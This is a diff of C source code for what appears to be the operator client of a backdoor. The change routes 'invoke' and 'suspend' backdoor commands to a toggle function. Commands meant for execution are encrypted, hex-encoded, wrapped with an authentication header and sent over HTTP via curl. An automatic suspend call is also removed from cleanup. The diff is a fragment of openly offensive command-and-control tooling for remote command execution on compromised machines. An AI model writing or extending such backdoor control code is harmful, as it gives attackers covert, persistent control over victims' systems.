@@ -15,7 +15,6 @@ static void toggle_backdoor(unsigned long message_id, int command_type)
 static void cleanup()
 {
   free(line);
-  toggle_backdoor(message_id, TYPE_SUSPEND_BACKDOOR);
   curl_global_cleanup();
   exit(EXIT_SUCCESS);
 }
@@ -150,23 +149,31 @@ int main()
     }
     snprintf(buf, sizeof(buf), "%.*s", i, line);
     command_type = get_command_type(buf);
-    randombytes_buf(nonce, sizeof(nonce));
 
-    if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)line, len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
+    if (command_type == TYPE_INVOKE_BACKDOOR || command_type == TYPE_SUSPEND_BACKDOOR)
     {
-      log_error("encrypt");
-      continue;
+      toggle_backdoor(message_id, command_type);
+    }
+    else // TYPE_EXECUTE_CMD
+    {
+      randombytes_buf(nonce, sizeof(nonce));
+      if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)line, len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
+      {
+        log_error("encrypt");
+        continue;
+      }
+
+      to_hex(ciphertext, ciphertext_len, ciphertext_hex);
+      to_hex(nonce, sizeof(nonce), nonce_hex);
+      if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
+      {
+        log_error("craft_message");
+        continue;
+      }
+
+      send_request(message);
     }
 
-    to_hex(ciphertext, ciphertext_len, ciphertext_hex);
-    to_hex(nonce, sizeof(nonce), nonce_hex);
-    if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
-    {
-      log_error("craft_message");
-      continue;
-    }
-
-    send_request(message);
     message_id++;
   }
 
